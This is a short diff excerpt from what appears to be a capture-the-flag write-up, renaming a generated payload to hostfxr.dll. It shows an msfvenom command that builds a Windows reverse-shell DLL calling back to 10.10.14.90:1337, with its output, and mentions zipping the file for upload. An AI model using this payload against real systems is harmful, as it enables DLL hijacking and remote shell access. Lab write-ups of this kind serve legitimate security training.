@@ -362,13 +362,13 @@ with zipfile.ZipFile('samples.zip', 'w') as z:
 Ill use this short script to zip the file once ive created the shell
 
 ```python
-msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1337 -f dll -o shell.dll
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.90 LPORT=1337 -f dll -o hostfxr.dll
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 [-] No arch selected, selecting arch: x64 from the payload
 No encoder specified, outputting raw payload
 Payload size: 460 bytes
 Final size of dll file: 9216 bytes
-Saved as: shell.dll
+Saved as: hostfxr.dll
 ```
 Next i can run the python script to zip the file which can then be uploaded
 
